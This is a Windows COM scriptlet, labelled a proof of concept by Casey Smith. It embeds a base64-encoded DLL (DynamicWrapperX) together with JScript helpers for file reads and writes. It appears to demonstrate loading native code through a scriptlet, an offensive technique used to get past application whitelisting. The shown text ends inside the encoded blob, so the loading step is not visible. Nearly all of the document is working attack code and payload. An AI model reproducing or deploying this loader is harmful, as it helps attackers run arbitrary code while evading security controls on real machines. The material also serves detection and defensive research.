<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
	<!-- Proof Of Concept - Casey Smith @subTee -->
	<!--  License: BSD3-Clause -->
	<script language="JScript">
		<![CDATA[
		
			var fsoForReading = 1;
			var fsoForWriting = 2;
			// Reference MSDN https://msdn.microsoft.com/en-us/library/aa265347(v=vs.60).aspx
			
			function sleep(delay) 
			{
				var start = new Date().getTime();
				while (new Date().getTime() < start + delay);
			}
			
			function LoadStringFromFile(filename)
			{
				var fso, f, data;
				fso = new ActiveXObject("Scripting.FileSystemObject");
				f = fso.OpenTextFile(filename, fsoForReading, true); 
				data = f.ReadAll();
				f.Close();
				return data;
			}

			function SaveStringToFile(filename, textString)
			{
				var fso, f;
				fso = new ActiveXObject("Scripting.FileSystemObject");
				f = fso.OpenTextFile(filename, fsoForWriting, true); 
				f.Write(textString);
				f.Close();
			}

			// Example File Prep
			// Output of 'certuil.exe /encode AllTheThingsx64.dll AllTheThingsx64.txt
			// Why bother writing a terrible Base64 encode/decode routine, when certutil.exe will do it for you.
			// 
			var x86dllEncoded = "-----BEGIN CERTIFICATE-----\
								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\
								XcIUALgFAAKA+evvjwQMAczDieBQaFAwABDosP7//+vrieBQaGAwABDoof7//+vc\
								ieBQaHAwABDokv7//+vNieBQaIAwABDog/7//+u+ieBQaJAwABDodP7//+uvieBQ\
								aKAwABDoZf7//+ugieBQaLAwABDoVv7//+uRieBQaMAwABDoR/7//+uCieBQaNAw\
								ABDoOP7//+lw////ieBQaOAwABDoJv7//+le////ieBQaPAwABDoFP7//+lM////\
								ieBQaAAxABDoAv7//+k6////ieBQaBAxABDo8P3//+ko////ieBQaCAxABDo3v3/\
								/+kW////ieBQaDAxABDozP3//+kE////ieBQaEAxABDouv3//+ny/v//VVZXU4nl\
								g+wEi10Ui3UYZoM7CXRDiw3YQQAQicpmiwO/yEEAEPzyZq91QynKSsHiAosGweAF\
								AdCNgNxBABCLAIXAdCpqAGoAU1DoNwAAAInsW19eXcIIAItDCGaDeCwDdAdmg3gs\
								BXWsjVgs66e4BQACgPmJ7FtfXl3CCACQkJCQkJCQkJBVVldTieWD7BSLdRiLRgiL\
								fRz/VRRyBoX/eAKJ+InsW19eXcIQACX/AAAA6wGYg+8EeAKJB/jDm9vj2UYI6wab\
								2+PdRgib2+LbXfib3+BmqSEAdQWLRfjr1bhXAAeA+cMl/wAAAOsBmIPvBHgCiQf4\
								w5vb49lGCOsGm9vj3UYIm9vi3334m9/gZqkhAHUVi0X4i1X8hdJ00HkJg/r/dQSF\
								wHjFuFcAB4D5wyX/AAAA6xBmCcB4PCX//wAA6wQJwHgxg+8EeAKJB/jDm9vj2UYI\
								6wab2+PdRgib2+Lfffib3+BmqSEAdQuDffwAdwWLRfjrz7hXAAeA+cMl/wAAAOsB\
								mIPvBHgCiQf4wz3/fwAAfys9AID//3wk6+eb2+PZRgjrBpvb491GCJvb4t9d+Jvf\
								4GapIQB1BYtF+OvEuFcAB4D5wyX/AAAA6wpmCcB4PSX//wAAg+8EeAKJB/jDCcB4\
								Kz3//wAAdyTr6pvb49lGCOsGm9vj3UYIm9vi2134m9/gZqkhAHUFi0X469G4VwAH\
								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\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								RHluYW1pY1dyYXBwZXJYAHs4OTU2NTI3NS1BNzE0LTRhNDMtOTEyRS05NzhCOTM1\
								RURDQ0N9AFNvZnR3YXJlXENsYXNzZXNcRHluYW1pY1dyYXBwZXJYAFNvZnR3YXJl\
								XENsYXNzZXNcQ0xTSURcezg5NTY1Mjc1LUE3MTQtNGE0My05MTJFLTk3OEI5MzVF\
								RENDQ30AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAARgEAAAAAAAAA\
								wAAAAAAAAEYABAIAAAAAAMAAAAAAAABGdVJWiRSnQ0qRLpeLk17czK8SABD2EgAQ\
								/BIAEAITABBsEwAQ6EAAEI4TABDkEwAQ9BMAECUUABAtFAAQNRQAEK4UABBBZHZh\
								cGkzMi5kbGwAUmVnQ3JlYXRlS2V5RXhBAFJlZ1NldFZhbHVlRXhBAFJlZ0Nsb3Nl\
								S2V5AEluUHJvY1NlcnZlcjMyACVzXCVzAENMU0lEACVzXCVzAHNobHdhcGkuZGxs\
								AFNIRGVsZXRlS2V5QQAAAGwAaAB1AHAAbgB0AGMAYgBkAGYAdwBzAHoATABIAFUA\
								UABOAFQAQwBCAEQARgBXAFMAWgAaAAAAAwACABEABQAEAAkAAAAIAAgAAAC+HQAQ\
								vR0AELYdABDPHQAQxx0AEAAAAAAAAAAAAAAAAPgdABD3HQAQ8B0AEAkeABABHgAQ\
								AAAAAAAAAAAAAAAATR4AEEEeABA6HgAQYh4AEFoeABAAAAAAAAAAAAAAAABNHgAQ\
								QR4AEDoeABBiHgAQWh4AEE0eABAAAAAAOSAAEJoeABCQHgAQiR4AELIeABCqHgAQ\
								AAAAAAAAAAAAAAAA7R4AENoeABDTHgAQAh8AEPoeABAAAAAAAAAAAAAAAAA3HwAQ\
								Nh8AECMfABBLHwAQQx8AEAAAAAAAAAAAAAAAAIUfABBsHwAQdx8AEJofABCSHwAQ\
								AAAAAAAAAAAAAAAAzx8AENcfABDfHwAQwx8AELsfABAAAAAAAAAAAAAAAAASIAAQ\
								GiAAECIgABDvHwAQBiAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAA5IAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEkgABAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQiAAEMAgABC3IAAQsCAAENUgABDKIAAQ\
								AAAAALsgABAAAAAA8CAAEOcgABDgIAAQBSEAEPogABAAAAAA6yAAEAAAAAAkIQAQ\
								FyEAEBAhABA4IQAQQyEAEAAAAAAfIQAQAAAAACQhABAXIQAQECEAEDghABBDIQAQ\
								AAAAAB8hABAAAAAAXiEAEFUhABBOIQAQciEAEH0hABAAAAAAWSEAEAAAAACcIQAQ\
								jyEAEIghABCwIQAQuyEAEAAAAACXIQAQAAAAANYhABDNIQAQxiEAEOohABD1IQAQ\
								AAAAANEhABAAAAAADSIAEAAiABAAIgAQISIAECwiABAAAAAACCIAEAAAAAB6IgAQ\
								diIAEG8iABCIIgAQkiIAEAAAAAB6IgAQAAAAAEIiABA+IgAQNyIAEGQiABBQIgAQ\
								AAAAAEIiABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAN4iABAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApCIAEAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAACdIgAQBCMAEAQjABAEIwAQBCMAEAQjABAEIwAQBCMAEAQjABA2IwAQ\
								NiMAEE4jABBOIwAQNSMAEEcjABAzIwAQQCMAEIMjABBvIwAQ2SMAEKUjABCeIwAQ\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAOMjABAAAAAAAAAAAFMAdAByAEcAZQB0AAAAAwAAAAoAAAAAALBFABAKAAAA\
								AgAAAL5FABAgMAAQBicAEAAAAABTAHQAcgBQAHQAcgAAABoAAAAKAAAAAwAAAAAA\
								5EUAEAsAAAACAAAA8kUAEPpFABByJgAQyEUAEFMAcABhAGMAZQAAAAIAAAAKAAAA\
								GgAAABxGABAMAAAAAgAAAChGABAwRgAQGCYAEABGABBOAHUAbQBQAHUAdAAAABoA\
								AAADAAAAAAAAAAoAAAADAAAAAABQRgAQDQAAAAQAAABeRgAQbkYAEGolABA0RgAQ\
								TgB1AG0ARwBlAHQAAAADAAAAAAAAAAoAAAAAAJBGABAOAAAAAwAAAJ5GABAkMAAQ\
								1SQAEHRGABBSAGUAZwBpAHMAdABlAHIAQwBhAGwAbABiAGEAYwBrAAAAAwAAAAoA\
								AAAKAAAAAwAAAAAAyEYAEA8AAAADAAAA6kYAEPZGABBAGgAQrEYAEFIAZQBnAGkA\
								cwB0AGUAcgAAAAoAAAAKAAAACgAAAAoAAAAKAAAAAAAAAAAAGEcAEBAAAAAFAAAA\
								KkcAED5HABDQFQAQ/EYAEEEAJXMlcwAAAAAAAAAAAAAAAAAAAAAk9BJAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANXX4SElBMDQAAAEA\
								EAAAABgAAIAAAAAANXX4SAAAAAAAAAEAAQAAADAAAIAAAAAANXX4SAAAAAAAAAEA\
								GQQAAEgAAABYUAAAQAMAAAAAAAAAAAAAQAM0AAAAVgBTAF8AVgBFAFIAUwBJAE8A\
								TgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAA\
								BAAAAAIAAAAAAAAAAAAAAAAAAACeAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkA\
								bgBmAG8AAAB6AgAAAQAwADQAMAA5ADAANABFADQAAACGADcAAQBDAG8AbQBtAGUA\
								bgB0AHMAAABBAGwAbABvAHcAcwAgAGYAbwByACAARABMAEwAIABmAHUAbgBjAHQA\
								aQBvAG4AIABjAGEAbABsAHMAIABpAG4AIABKAFMAYwByAGkAcAB0ACAAYQBuAGQA\
								IABWAEIAUwBjAHIAaQBwAHQALgAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEA\
								bQBlAAAAAAAAAAAAVgAXAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4A\
								AAAAAEQAeQBuAGEAbQBpAGMAVwByAGEAcABwAGUAcgBYACAAbwBiAGoAZQBjAHQA\
								AAAAACoABQABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAAMAAAAAAA\
								MgAJAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABkAHkAbgB3AHIAYQBwAHgA\
								AAAAAEoAEwABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAKkAIABZAHUA\
								cgBpACAAUABvAHAAbwB2ACwAIAAyADAAMAA4AAAAAABCAA0AAQBPAHIAaQBnAGkA\
								bgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAZAB5AG4AdwByAGEAcAB4AC4AZABsAGwA\
								AAAAAEAAEAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAARAB5AG4AYQBtAGkA\
								YwBXAHIAYQBwAHAAZQByAFgAAAAuAAUAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMA\
								aQBvAG4AAAAxAC4AMAAwAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A\
								AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAACQTkBAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								/yXoYAAQ/yXsYAAQ/yXwYAAQ/yX0YAAQ/yX4YAAQ/yX8YAAQ/yUAYQAQ/yUEYQAQ\
								/yUIYQAQ/yUMYQAQ/yUQYQAQ/yUUYQAQ/yUYYQAQ/yUcYQAQ/yUkYQAQ/yUoYQAQ\
